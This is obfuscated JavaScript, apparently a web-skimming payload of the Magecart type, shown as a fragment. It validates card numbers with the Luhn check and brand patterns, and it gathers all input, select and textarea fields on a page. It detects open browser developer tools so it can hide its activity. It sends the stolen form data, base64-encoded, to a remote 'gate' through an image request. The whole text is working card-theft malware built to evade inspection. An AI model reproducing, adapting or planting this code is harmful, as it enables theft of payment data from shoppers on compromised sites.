_0x585bca(_0x49108e,_0x337cc6,_0x472fb9){return _0x49108e[_0x199c('0x0')](new RegExp(_0x337cc6,'\x67'),_0x472fb9);}function _0x2cec68(_0x6910fc){var _0x1169d9=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x133e49=/^(?:5[1-5][0-9]{14})$/;var _0x1eb369=/^(?:3[47][0-9]{13})$/;var _0x435a0e=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x35f9ec=![];if(_0x1169d9['\x74\x65\x73\x74'](_0x6910fc)){_0x35f9ec=!![];}else if(_0x133e49[_0x199c('0x1')](_0x6910fc)){_0x35f9ec=!![];}else if(_0x1eb369[_0x199c('0x1')](_0x6910fc)){_0x35f9ec=!![];}else if(_0x435a0e[_0x199c('0x1')](_0x6910fc)){_0x35f9ec=!![];}return _0x35f9ec;}function _0x1161cb(_0x145c5d){if(/[^0-9-\s]+/[_0x199c('0x1')](_0x145c5d))return![];var _0x5633a1=0x0,_0xf685cd=0x0,_0x3c7961=![];_0x145c5d=_0x145c5d[_0x199c('0x0')](/\D/g,'');for(var _0x48f879=_0x145c5d[_0x199c('0x2')]-0x1;_0x48f879>=0x0;_0x48f879--){var _0x569a5a=_0x145c5d[_0x199c('0x3')](_0x48f879),_0xf685cd=parseInt(_0x569a5a,0xa);if(_0x3c7961){if((_0xf685cd*=0x2)>0x9)_0xf685cd-=0x9;}_0x5633a1+=_0xf685cd;_0x3c7961=!_0x3c7961;}return _0x5633a1%0xa==0x0;}(function(){'use strict';const _0x171257={};_0x171257['\x69\x73\x4f\x70\x65\x6e']=![];_0x171257['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x215ed5=0xa0;const _0x35c171=(_0x5b242a,_0x28359d)=>{window[_0x199c('0x4')](new CustomEvent(_0x199c('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x5b242a,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x28359d}}));};setInterval(()=>{const _0x71af43=window[_0x199c('0x6')]-window[_0x199c('0x7')]>_0x215ed5;const _0x1da6bc=window[_0x199c('0x8')]-window[_0x199c('0x9')]>_0x215ed5;const _0x10dede=_0x71af43?_0x199c('0xa'):_0x199c('0xb');if(!(_0x1da6bc&&_0x71af43)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x199c('0xc')][_0x199c('0xd')]&&window[_0x199c('0xc')][_0x199c('0xd')][_0x199c('0xe')]||_0x71af43||_0x1da6bc)){if(!_0x171257[_0x199c('0xf')]||_0x171257[_0x199c('0x10')]!==_0x10dede){_0x35c171(!![],_0x10dede);}_0x171257[_0x199c('0xf')]=!![];_0x171257[_0x199c('0x10')]=_0x10dede;}else{if(_0x171257[_0x199c('0xf')]){_0x35c171(![],undefined);}_0x171257['\x69\x73\x4f\x70\x65\x6e']=![];_0x171257[_0x199c('0x10')]=undefined;}},0x1f4);if(typeof module!==_0x199c('0x11')&&module[_0x199c('0x12')]){module[_0x199c('0x12')]=_0x171257;}else{window[_0x199c('0x13')]=_0x171257;}}());String[_0x199c('0x14')][_0x199c('0x15')]=function(){var _0x2a964e=0x0,_0x3bbad3,_0x1a1893;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x2a964e;for(_0x3bbad3=0x0;_0x3bbad3<this[_0x199c('0x2')];_0x3bbad3++){_0x1a1893=this[_0x199c('0x16')](_0x3bbad3);_0x2a964e=(_0x2a964e<<0x5)-_0x2a964e+_0x1a1893;_0x2a964e|=0x0;}return _0x2a964e;};var _0x35fcbc={};_0x35fcbc[_0x199c('0x17')]=_0x199c('0x18');_0x35fcbc[_0x199c('0x19')]={};_0x35fcbc[_0x199c('0x1a')]=[];_0x35fcbc['\x49\x73\x56\x61\x6c\x69\x64']=![];_0x35fcbc[_0x199c('0x1b')]=function(_0x5c3159){if(_0x5c3159.id!==undefined&&_0x5c3159.id!=''&&_0x5c3159.id!==null&&_0x5c3159.value.length<0x100&&_0x5c3159.value.length>0x0){if(_0x1161cb(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20',''))&&_0x2cec68(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20','')))_0x35fcbc.IsValid=!![];_0x35fcbc.Data[_0x5c3159.id]=_0x5c3159.value;return;}if(_0x5c3159.name!==undefined&&_0x5c3159.name!=''&&_0x5c3159.name!==null&&_0x5c3159.value.length<0x100&&_0x5c3159.value.length>0x0){if(_0x1161cb(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20',''))&&_0x2cec68(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20','')))_0x35fcbc.IsValid=!![];_0x35fcbc.Data[_0x5c3159.name]=_0x5c3159.value;return;}};_0x35fcbc['\x53\x61\x76\x65\x41\x6c\x6c\x46\x69\x65\x6c\x64\x73']=function(){var _0x5ef99b=document.getElementsByTagName(_0x199c('0x1c'));var _0x18b27a=document.getElementsByTagName(_0x199c('0x1d'));var _0x58c44b=document.getElementsByTagName(_0x199c('0x1e'));for(var _0x40311d=0x0;_0x40311d<_0x5ef99b.length;_0x40311d++)_0x35fcbc.SaveParam(_0x5ef99b[_0x40311d]);for(var _0x40311d=0x0;_0x40311d<_0x18b27a.length;_0x40311d++)_0x35fcbc.SaveParam(_0x18b27a[_0x40311d]);for(var _0x40311d=0x0;_0x40311d<_0x58c44b.length;_0x40311d++)_0x35fcbc.SaveParam(_0x58c44b[_0x40311d]);};_0x35fcbc[_0x199c('0x1f')]=function(){if(!window.devtools.isOpen&&_0x35fcbc.IsValid){_0x35fcbc.Data[_0x199c('0x20')]=location.hostname;var _0x376e6a=encodeURIComponent(window.btoa(JSON.stringify(_0x35fcbc.Data)));var _0x1a1af5=_0x376e6a.hashCode();for(var _0x3bd3e2=0x0;_0x3bd3e2<_0x35fcbc.Sent.length;_0x3bd3e2++)if(_0x35fcbc.Sent[_0x3bd3e2]==_0x1a1af5)return;_0x35fcbc.LoadImage(_0x376e6a);}};_0x35fcbc[_0x199c('0x21')]=function(){_0x35fcbc.SaveAllFields();_0x35fcbc.SendData();};_0x35fcbc[_0x199c('0x22')]=function(_0xa092e6){_0x35fcbc.Sent.push(_0xa092e6.hashCode());var _0x5445ff=document.createElement(_0x199c('0x23'));_0x5445ff.src=_0x35fcbc.GetImageUrl(_0xa092e6);};_0x35fcbc[_0x199c('0x24')]=function(_0x2bb309){return _0x35fcbc.Gate+_0x199c('0x25')+_0x2bb309;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0x199c('0x26')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x199c('0x27')](_0x35fcbc['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};